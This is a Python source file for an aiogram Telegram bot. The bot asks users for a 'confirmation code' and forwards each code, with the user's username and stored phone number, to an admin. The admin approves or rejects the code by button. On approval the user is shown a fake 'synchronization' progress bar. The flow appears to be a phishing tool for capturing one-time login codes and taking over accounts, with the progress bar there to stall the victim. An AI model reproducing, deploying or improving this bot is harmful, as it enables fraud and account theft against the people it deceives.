import asyncio
from typing import Annotated, Any
import random

from aiogram.filters import StateFilter
from aiogram import Router, types, F
from aiogram.enums.chat_type import ChatType
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

from src.routers.client.state import CodeRequest
from src.common.logger import Logger
from src.common.markers import TransactionGatewayMarker
from src.common.sdi import Depends, inject
from src.database import DatabaseGateway
from src.common.sdi import Depends, inject
from src.core import Settings

code_router = Router()


@inject
def get_settings(
        self, settings: Settings = Depends(Settings, use_cache=True)
) -> Settings:
    return settings


async def inline_code_request():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Получить код подтверждения", callback_data="code_request")]
    ])
    return keyboard


@code_router.callback_query(F.data == "code_request")
@inject
async def handle_code_request(
        callback: CallbackQuery,
        state: FSMContext,
        logger: Logger,
        gateway: Annotated[DatabaseGateway, Depends(TransactionGatewayMarker)],
) -> None:
    commands_repository = gateway.commands()
    commands_response = await commands_repository.select(command_tag='code_responser')

    if commands_response:
        response_text = commands_response.text if commands_response else "Сейчас вам придёт код, впишите его в строку ввода"

        if commands_response.image_item_id:
            try:
                await callback.message.answer_photo(photo=commands_response.image_item_id, caption=response_text)
                logger.debug(f"Client: Add photo to message, my message: {commands_response.image_item_id}")
            except Exception as e:
                logger.error(f"File not found: {commands_response.image_item_id}")
                await callback.message.answer(text=response_text)
        else:
            await callback.message.answer(text=response_text)
    else:
        logger.error("Command response is None, falling back to default message.")
        await callback.message.answer(text="Сейчас вам придёт код, впишите его в строку ввода")

    await state.set_state(CodeRequest.waiting_for_code)


async def inline_code_response(id):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅",
                                 callback_data=f"aprove_message;{id}"),
            InlineKeyboardButton(text="❌",
                                 callback_data=f"not_aprove_message;{id}")
        ]
    ])
    return keyboard


@code_router.message(StateFilter(CodeRequest.waiting_for_code))
@inject
async def process_user_output(message: types.Message,
                              state: FSMContext,
                              settings: get_settings,
                              logger: Logger,
                              gateway: Annotated[DatabaseGateway, Depends(TransactionGatewayMarker)],
                              ) -> None:
    user_repository = gateway.user()
    user_database = await user_repository.select_by_username(username=message.from_user.username)

    phone = user_database.number
    user_data = message.text
    text = f"Юзер - {message.from_user.username}, номер - {phone}. Код - {user_data}"

    user_chat_id = message.from_user.id
    keyboard = await inline_code_response(id=user_chat_id)
    await message.bot.send_message(settings.bot.admins[0], text=text, reply_markup=keyboard)
    logger.debug(f"user_chat_id data in process_user_output: {user_chat_id}")


@code_router.callback_query(lambda c: c.data.startswith("not_aprove_message"))
@inject
async def return_noaprove_request(
        callback: CallbackQuery,
        state: FSMContext,
        logger: Logger,
        gateway: Annotated[DatabaseGateway, Depends(TransactionGatewayMarker)],
) -> None:
    user_chat_id = callback.data.split(";")[1]
    logger.debug(f"Data from FSMContext: {user_chat_id}")

    if not user_chat_id:
        logger.debug("Ошибка: ID чата пользователя не найден.")
        return
    logger.debug(f"Чат Юзера: {user_chat_id}")

    commands_repository = gateway.commands()
    command_response = await commands_repository.select(command_tag='second_code_responser')
    keyboard = await inline_code_request()
    if command_response:
        response_text = command_response.text if command_response.text else "Ошибка. Неправильный код."
        if command_response.image_item_id:
            try:
                await callback.message.bot.send_photo(user_chat_id, photo=command_response.image_item_id,
                                                      caption=response_text,
                                                      reply_markup=keyboard)
                logger.debug(f"Client: Add photo to message, my message: {command_response.image_item_id}")
            except Exception as e:
                logger.error(f"Error sending image: {str(e)}")
                await callback.message.bot.send_message(user_chat_id, text=response_text, reply_markup=keyboard)
        else:
            await callback.message.bot.send_message(user_chat_id, text=response_text, reply_markup=keyboard)
    else:
        logger.error("Command response is None, falling back to default message.")
        await callback.message.bot.send_message(user_chat_id, text="Ошибка. Неправильный код.", reply_markup=keyboard)

    await state.set_state()


@code_router.callback_query(lambda c: c.data.startswith("aprove_message"))
@inject
async def return_aprove_message(
        callback: CallbackQuery,
        state: FSMContext,
        logger: Logger,
        gateway: Annotated[DatabaseGateway, Depends(TransactionGatewayMarker)],
) -> None:
    user_chat_id = callback.data.split(";")[1]
    logger.debug(f"Загруженные данные: {user_chat_id}")
    if not user_chat_id:
        logger.debug("Ошибка: ID чата пользователя не найден")
        return
    logger.debug(f"Чат Юзера: {user_chat_id}")
    commands_repository = gateway.commands()
    await callback.answer()
    sent_message = await callback.bot.send_message(user_chat_id, "Код успешно получен. Синхронизация.\nLoading 0%")
    message_id_to_edit = sent_message.message_id
    for i in range(1, 101):
        percent = i
        sleep_duration = random.uniform(0.1, 1)
        await asyncio.sleep(sleep_duration)
        await callback.bot.edit_message_text(chat_id=user_chat_id, message_id=message_id_to_edit,
                                             text=f"Код успешно получен. Синхронизация.\nLoading {percent}%")
    await callback.bot.edit_message_text(chat_id=user_chat_id, message_id=message_id_to_edit,
                                         text="Process completed!")
